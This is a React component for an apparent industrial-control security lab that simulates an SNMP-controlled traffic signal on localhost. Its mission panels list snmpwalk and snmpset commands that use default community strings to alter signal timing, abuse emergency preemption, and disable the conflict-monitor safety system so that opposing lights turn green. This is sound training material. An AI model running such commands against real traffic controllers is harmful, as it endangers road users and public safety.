import { useState } from "react";
import { API_URL } from "../../socket";
import type { ProcessState } from "../../types/process";

interface TrafficLabMonitorProps {
  displayed: ProcessState;
  actual: ProcessState;
}

type MissionId = "discovery" | "timing" | "preemption" | "conflict";

interface Mission {
  id: MissionId;
  title: string;
  difficulty: string;
  objective: string;
  background: string;
  steps: string[];
  successCondition: string;
  checkImpact: string[];
}

const MISSIONS: Mission[] = [
  {
    id: "discovery",
    title: "Phase 1: Discovery & Enumeration",
    difficulty: "BEGINNER",
    objective:
      "Discover the SNMP service, guess the community string, and enumerate all OIDs to map the intersection's control parameters.",
    background:
      'In 2014, University of Michigan researchers found ~100 traffic controllers with default SNMP credentials accessible over wireless. Community strings like "public" and "private" are factory defaults that are rarely changed.',
    steps: [
      "# Step 1: Scan for open UDP ports on the target",
      "nmap -sU -p 161,162,5020-5030 localhost",
      "# Look for any open UDP port — SNMP typically runs on 161,",
      "# but ICS devices often use non-standard ports.",
      "",
      "# Step 2: Walk the entire device using default credentials",
      "# 'public' is the most common factory-default community string.",
      "# Walk from the MIB root to dump everything the device exposes:",
      "snmpwalk -v2c -c public localhost:5021 1.3.6.1",
      "# If data comes back, you've confirmed two things at once:",
      "#   1. The device speaks SNMP",
      "#   2. The default 'public' credential was never changed",
      "",
      "# Step 3: Read a specific OID to understand the data format",
      "# Pick one from the walk output and query it directly:",
      "snmpget -v2c -c public localhost:5021 1.3.6.1.4.1.99999.1.1.1.0",
      "# Compare the value to the Intersection View — they should match.",
      "",
      "# Step 4: Try 'private' — the other common default credential",
      "# If it works, you may have WRITE access to the controller",
      "snmpget -v2c -c private localhost:5021 1.3.6.1.4.1.99999.1.6.1.0",
      "# Same data returned? You now have READ-WRITE access.",
      "# Check the OID Map above to see which OIDs are writable.",
    ],
    successCondition:
      'You can read all OIDs with "public" and access writable OIDs with "private". No real authentication.',
    checkImpact: [
      "No visible impact — this is passive reconnaissance",
      "Intersection Overview — verify values match what you read",
    ],
  },
  {
    id: "timing",
    title: "Phase 2: Timing Manipulation",
    difficulty: "INTERMEDIATE",
    objective:
      "Change traffic signal timing to cause gridlock on one direction while giving the other excessive green time.",
    background:
      "Traffic signal timing is critical for traffic flow. Even small changes (5-10 seconds) can cause significant congestion. An attacker with write access can create gridlock across entire corridors.",
    steps: [
      '# Attack A: STARVE N-S direction (5s green instead of 30s)',
      '# Cars barely clear before it turns red again',
      "snmpset -v2c -c private localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.6.1.0 i 5",
      "",
      "# Attack B: Give E-W excessive green time (120s)",
      "snmpset -v2c -c private localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.6.2.0 i 120",
      "",
      "# Combined: Starve N-S AND boost E-W",
      "snmpset -v2c -c private localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.6.1.0 i 5",
      "snmpset -v2c -c private localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.6.2.0 i 120",
      "",
      "# Monitor gridlock level:",
      "snmpget -v2c -c public localhost:5021 1.3.6.1.4.1.99999.1.4.2.0",
    ],
    successCondition:
      "N-S queue exceeds 20 cars and gridlock level rises above 40%.",
    checkImpact: [
      "Intersection View — N-S queue grows rapidly, E-W flows freely",
      "Signal Controller — gridlock meter rises, queue trend spikes",
      "Signal Controller — 'Timing Modified' alarm activates",
    ],
  },
  {
    id: "preemption",
    title: "Phase 3: Emergency Preemption Abuse",
    difficulty: "INTERMEDIATE",
    objective:
      "Trigger the emergency vehicle preemption (EVP) system to override normal signal cycling and force one direction to permanent green.",
    background:
      "Emergency preemption allows fire trucks and ambulances to get green lights. Devices like MIRT (Mobile Infrared Transmitter) have been purchased by civilians to abuse this. Our SNMP-based preemption is even easier to trigger.",
    steps: [
      "# Trigger N-S preemption (all E-W goes red)",
      "snmpset -v2c -c private localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.8.1.0 i 1",
      "",
      "# Watch E-W queue build up (they NEVER get green):",
      "watch -n 1 'snmpget -v2c -c public localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.2.2.0'",
      "",
      "# Switch to E-W preemption (now N-S is starved):",
      "snmpset -v2c -c private localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.8.1.0 i 2",
      "",
      "# Disable preemption (return to normal cycling):",
      "snmpset -v2c -c private localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.8.1.0 i 0",
    ],
    successCondition:
      "E-W queue exceeds 30 cars during N-S preemption. Normal cycling is completely suppressed.",
    checkImpact: [
      "Intersection View — one direction permanently green, other permanently red",
      "Intersection View — 'PREEMPTION ACTIVE' status displayed",
      "Signal Controller — preemption alarm triggers, queue imbalance grows",
    ],
  },
  {
    id: "conflict",
    title: "Phase 4: Conflict Monitor Bypass",
    difficulty: "ADVANCED",
    objective:
      "Disable the safety system (conflict monitor) and then force opposing green lights simultaneously — creating a collision risk at the intersection.",
    background:
      "This parallels the 2017 TRISIS/Triton attack on a Saudi petrochemical plant. Attackers first disabled the Safety Instrumented System (SIS) before launching the main attack. The conflict monitor is the traffic equivalent — a hardware safety device that detects dangerous states.",
    steps: [
      "# Step 1: Hold phase 1 (N-S green stays on)",
      "snmpset -v2c -c private localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.7.1.0 i 1",
      "",
      "# Step 2: Activate preemption for E-W (opposite direction)",
      "# Phase hold wants N-S green, preemption wants E-W green",
      "# — these are CONFLICTING demands!",
      "snmpset -v2c -c private localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.8.1.0 i 2",
      "# The conflict monitor catches it → FLASH MODE (safe failure)",
      "# Verify flash mode is active:",
      "snmpget -v2c -c public localhost:5021 1.3.6.1.4.1.99999.1.5.2.0",
      "# Should return INTEGER: 1 (flash mode ON)",
      "",
      "# Step 3: Clear the conflict, then DISABLE the safety system",
      "snmpset -v2c -c private localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.8.1.0 i 0",
      "snmpset -v2c -c private localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.7.1.0 i 0",
      "# Now disable the conflict monitor (the TRISIS/Triton move):",
      "snmpset -v2c -c private localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.9.1.0 i 0",
      "",
      "# Step 4: Re-create the conflict — WITH NO SAFETY NET",
      "snmpset -v2c -c private localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.7.1.0 i 1",
      "snmpset -v2c -c private localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.8.1.0 i 2",
      "# Both directions now have GREEN — COLLISION RISK!",
      "# Verify conflict detected (no flash mode to save us):",
      "snmpget -v2c -c public localhost:5021 1.3.6.1.4.1.99999.1.5.3.0",
      "# Should return INTEGER: 1 (conflict detected, no safe failure)",
      "",
      "# To restore safety:",
      "snmpset -v2c -c private localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.9.1.0 i 1",
      "snmpset -v2c -c private localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.8.1.0 i 0",
      "snmpset -v2c -c private localhost:5021 \\",
      "  1.3.6.1.4.1.99999.1.7.1.0 i 0",
    ],
    successCondition:
      "Conflict monitor disabled AND conflict detected (opposing greens with no safe failure). COLLISION RISK displayed.",
    checkImpact: [
      "Intersection View — with monitor ON: flash mode activates (safe)",
      "Intersection View — with monitor OFF: COLLISION RISK overlay appears",
      "Signal Controller — conflict alarm triggers, monitor status shows DISABLED",
    ],
  },
];

const OID_MAP = [
  { oid: ".1.1.0", name: "current_phase", type: "R", defaultVal: "1", desc: "Current phase (1-6)" },
  { oid: ".1.2.0", name: "ns_light", type: "R", defaultVal: "3", desc: "N-S light (1=R,2=Y,3=G)" },
  { oid: ".1.3.0", name: "ew_light", type: "R", defaultVal: "1", desc: "E-W light (1=R,2=Y,3=G)" },
  { oid: ".1.4.0", name: "phase_timer", type: "R", defaultVal: "30", desc: "Seconds remaining" },
  { oid: ".2.1.0", name: "ns_queue", type: "R", defaultVal: "0", desc: "N-S vehicles queued" },
  { oid: ".2.2.0", name: "ew_queue", type: "R", defaultVal: "0", desc: "E-W vehicles queued" },
  { oid: ".2.3.0", name: "ns_avg_wait", type: "R", defaultVal: "0", desc: "N-S avg wait (s)" },
  { oid: ".2.4.0", name: "ew_avg_wait", type: "R", defaultVal: "0", desc: "E-W avg wait (s)" },
  { oid: ".3.1.0", name: "ns_pedestrian", type: "R", defaultVal: "1", desc: "N-S ped (1=walk,2=stop)" },
  { oid: ".3.2.0", name: "ew_pedestrian", type: "R", defaultVal: "2", desc: "E-W ped (1=walk,2=stop)" },
  { oid: ".4.1.0", name: "total_vehicles", type: "R", defaultVal: "0", desc: "Total vehicles passed" },
  { oid: ".4.2.0", name: "gridlock_level", type: "R", defaultVal: "0", desc: "Gridlock (0-100)" },
  { oid: ".5.2.0", name: "flash_mode", type: "R", defaultVal: "0", desc: "Flash mode (0/1)" },
  { oid: ".5.3.0", name: "conflict_detected", type: "R", defaultVal: "0", desc: "Conflict (0/1)" },
  { oid: ".6.1.0", name: "ns_green_time", type: "RW", defaultVal: "30", desc: "ATTACKABLE — N-S green duration" },
  { oid: ".6.2.0", name: "ew_green_time", type: "RW", defaultVal: "30", desc: "ATTACKABLE — E-W green duration" },
  { oid: ".7.1.0", name: "phase_hold", type: "RW", defaultVal: "0", desc: "ATTACKABLE — Hold phase (0=off)" },
  { oid: ".8.1.0", name: "preemption_active", type: "RW", defaultVal: "0", desc: "ATTACKABLE — Preemption (0/1/2)" },
  { oid: ".9.1.0", name: "conflict_monitor", type: "RW", defaultVal: "1", desc: "ATTACKABLE — Safety (1=on,0=off)" },
];

export function TrafficLabMonitor({
  displayed,
  actual,
}: TrafficLabMonitorProps) {
  const [selectedMission, setSelectedMission] = useState<MissionId>("discovery");
  const [showOidMap, setShowOidMap] = useState(false);

  const mission = MISSIONS.find((m) => m.id === selectedMission)!;
  const traffic = actual.traffic;

  const resetSystem = async () => {
    await fetch(`${API_URL}/api/reset`, { method: "POST" });
  };

  // Detect attack
  const isUnderAttack =
    traffic.ns_green_time !== 30 ||
    traffic.ew_green_time !== 30 ||
    traffic.phase_hold > 0 ||
    traffic.preemption_active > 0 ||
    !traffic.conflict_monitor_enabled ||
    traffic.flash_mode ||
    traffic.conflict_detected;

  return (
    <div className="bg-gray-950 text-white p-4 h-full">
      {/* Header */}
      <div className="flex justify-between items-center mb-4">
        <div>
          <h1 className="text-xl font-mono font-bold text-amber-400">
            LAB MONITOR
          </h1>
          <p className="text-sm font-mono text-gray-500">
            Operation Gridlock — Attack via SNMP, observe impact here
          </p>
        </div>
        <div className="flex gap-2">
          <button
            onClick={() => setShowOidMap(!showOidMap)}
            className="bg-gray-800 hover:bg-gray-700 text-gray-300 px-3 py-2 rounded font-mono text-xs border border-gray-700"
          >
            {showOidMap ? "HIDE" : "SHOW"} OID MAP
          </button>
          <button
            onClick={resetSystem}
            className="bg-gray-800 hover:bg-gray-700 text-gray-300 px-3 py-2 rounded font-mono text-xs border border-gray-700"
          >
            RESET SYSTEM
          </button>
        </div>
      </div>

      {/* OID Map */}
      {showOidMap && (
        <div className="bg-gray-900 rounded-lg p-3 border border-gray-800 mb-4">
          <h3 className="text-xs font-mono text-cyan-400 mb-2 font-bold">
            SNMP OID TREE — Base: 1.3.6.1.4.1.99999.1
          </h3>
          <div className="flex gap-2 mb-2 text-[10px] font-mono text-gray-500">
            <span>Community: <span className="text-green-400">"public"</span> (read)</span>
            <span>|</span>
            <span>Community: <span className="text-red-400">"private"</span> (read-write)</span>
            <span>|</span>
            <span>Port: <span className="text-cyan-400">UDP 5021</span></span>
          </div>
          <table className="w-full text-xs font-mono">
            <thead>
              <tr className="text-gray-500 border-b border-gray-800">
                <th className="text-left p-1">OID Suffix</th>
                <th className="text-left p-1">Name</th>
                <th className="text-left p-1">Access</th>
                <th className="text-left p-1">Default</th>
                <th className="text-left p-1">Description</th>
              </tr>
            </thead>
            <tbody>
              {OID_MAP.map((o) => (
                <tr
                  key={o.oid}
                  className={`border-b border-gray-800/30 ${
                    o.type === "RW" ? "text-red-300" : "text-gray-300"
                  }`}
                >
                  <td className="p-1 text-cyan-400">{o.oid}</td>
                  <td className="p-1">{o.name}</td>
                  <td className="p-1">
                    <span
                      className={`px-1 rounded ${
                        o.type === "RW"
                          ? "bg-red-900 text-red-300"
                          : "bg-gray-800 text-gray-400"
                      }`}
                    >
                      {o.type}
                    </span>
                  </td>
                  <td className="p-1 text-yellow-400">{o.defaultVal}</td>
                  <td className="p-1 text-gray-500 text-[10px]">{o.desc}</td>
                </tr>
              ))}
            </tbody>
          </table>
          <p className="text-[10px] text-red-400 mt-2">
            Red rows = writable (attackable) with "private" community string
          </p>
        </div>
      )}

      {/* Mission selector */}
      <div className="flex gap-2 mb-4">
        {MISSIONS.map((m, i) => (
          <button
            key={m.id}
            onClick={() => setSelectedMission(m.id)}
            className={`px-3 py-2 rounded font-mono text-xs border ${
              selectedMission === m.id
                ? "bg-amber-900 border-amber-600 text-amber-200"
                : "bg-gray-900 border-gray-700 text-gray-400 hover:border-gray-500"
            }`}
          >
            Phase {i + 1}
          </button>
        ))}
      </div>

      <div className="grid grid-cols-3 gap-3">
        {/* Left: Mission briefing + commands */}
        <div className="col-span-2 space-y-3">
          <div className="bg-gray-900 rounded-lg p-4 border border-gray-800">
            <div className="flex justify-between items-start mb-3">
              <h2 className="font-mono text-sm font-bold text-gray-200">
                {mission.title}
              </h2>
              <span
                className={`text-xs font-mono px-2 py-1 rounded ${
                  mission.difficulty === "BEGINNER"
                    ? "bg-green-900 text-green-300"
                    : mission.difficulty === "INTERMEDIATE"
                    ? "bg-yellow-900 text-yellow-300"
                    : "bg-red-900 text-red-300"
                }`}
              >
                {mission.difficulty}
              </span>
            </div>

            <div className="mb-3">
              <h3 className="text-xs font-mono text-amber-400 mb-1">
                OBJECTIVE
              </h3>
              <p className="text-xs text-gray-300">{mission.objective}</p>
            </div>

            <div className="mb-3">
              <h3 className="text-xs font-mono text-gray-500 mb-1">
                BACKGROUND
              </h3>
              <p className="text-xs text-gray-400 italic">
                {mission.background}
              </p>
            </div>

            <div className="mb-3">
              <h3 className="text-xs font-mono text-green-400 mb-1">
                SUCCESS CONDITION
              </h3>
              <p className="text-xs text-green-300">
                {mission.successCondition}
              </p>
            </div>

            <div>
              <h3 className="text-xs font-mono text-blue-400 mb-1">
                WHERE TO CHECK IMPACT
              </h3>
              <ul className="text-xs text-gray-400 space-y-1">
                {mission.checkImpact.map((item, i) => (
                  <li key={i} className="flex gap-2">
                    <span className="text-blue-500">-</span> {item}
                  </li>
                ))}
              </ul>
            </div>
          </div>

          <div className="bg-black rounded-lg p-4 border border-gray-800">
            <h3 className="text-xs font-mono text-green-400 mb-2 font-bold">
              COMMANDS — Run these in your terminal
            </h3>
            <pre className="text-xs font-mono text-gray-300 overflow-x-auto whitespace-pre">
              {mission.steps.join("\n")}
            </pre>
          </div>
        </div>

        {/* Right: Live state */}
        <div className="space-y-3">
          {/* Attack detection */}
          <div
            className={`rounded-lg p-3 border font-mono text-xs text-center font-bold ${
              isUnderAttack
                ? "bg-red-900/30 border-red-600 text-red-300 animate-pulse"
                : "bg-green-900/30 border-green-800 text-green-400"
            }`}
          >
            {isUnderAttack
              ? "ATTACK DETECTED — Abnormal values"
              : "NO ATTACK — System normal"}
          </div>

          {/* Intersection Status */}
          <div className="bg-gray-900 rounded-lg p-3 border border-gray-800">
            <h3 className="text-xs font-mono text-cyan-400 mb-2 font-bold">
              INTERSECTION STATUS
            </h3>
            <div className="space-y-1.5 text-xs font-mono">
              {[
                { label: "Phase", val: `Phase ${traffic.current_phase}` },
                { label: "N-S Light", val: traffic.ns_light.toUpperCase() },
                { label: "E-W Light", val: traffic.ew_light.toUpperCase() },
                { label: "N-S Queue", val: `${traffic.ns_queue} cars`, warn: traffic.ns_queue > 30 },
                { label: "E-W Queue", val: `${traffic.ew_queue} cars`, warn: traffic.ew_queue > 30 },
                { label: "N-S Wait", val: `${traffic.ns_wait_time}s`, warn: traffic.ns_wait_time > 30 },
                { label: "E-W Wait", val: `${traffic.ew_wait_time}s`, warn: traffic.ew_wait_time > 30 },
                { label: "Gridlock", val: `${traffic.gridlock_level.toFixed(0)}%`, warn: traffic.gridlock_level > 40 },
              ].map(({ label, val, warn }) => (
                <div key={label} className="flex justify-between">
                  <span className="text-gray-500">{label}</span>
                  <span className={warn ? "text-yellow-400" : "text-cyan-300"}>
                    {val}
                  </span>
                </div>
              ))}
            </div>
          </div>

          {/* Attack Parameters */}
          <div className="bg-gray-900 rounded-lg p-3 border border-red-900/30">
            <h3 className="text-xs font-mono text-red-400 mb-2 font-bold">
              ATTACK PARAMETERS
            </h3>
            <div className="space-y-1.5 text-xs font-mono">
              {[
                { label: "N-S Green", val: `${traffic.ns_green_time}s`, danger: traffic.ns_green_time !== 30 },
                { label: "E-W Green", val: `${traffic.ew_green_time}s`, danger: traffic.ew_green_time !== 30 },
                { label: "Phase Hold", val: traffic.phase_hold > 0 ? `Phase ${traffic.phase_hold}` : "OFF", danger: traffic.phase_hold > 0 },
                { label: "Preemption", val: traffic.preemption_active > 0 ? (traffic.preemption_active === 1 ? "N-S" : "E-W") : "OFF", danger: traffic.preemption_active > 0 },
                { label: "Conflict Mon", val: traffic.conflict_monitor_enabled ? "ON" : "OFF", danger: !traffic.conflict_monitor_enabled },
                { label: "Flash Mode", val: traffic.flash_mode ? "ACTIVE" : "OFF", danger: traffic.flash_mode },
                { label: "Conflict", val: traffic.conflict_detected ? "YES" : "NO", danger: traffic.conflict_detected },
              ].map(({ label, val, danger }) => (
                <div key={label} className="flex justify-between">
                  <span className="text-gray-500">{label}</span>
                  <span
                    className={
                      danger ? "text-red-400 font-bold" : "text-gray-300"
                    }
                  >
                    {val}
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
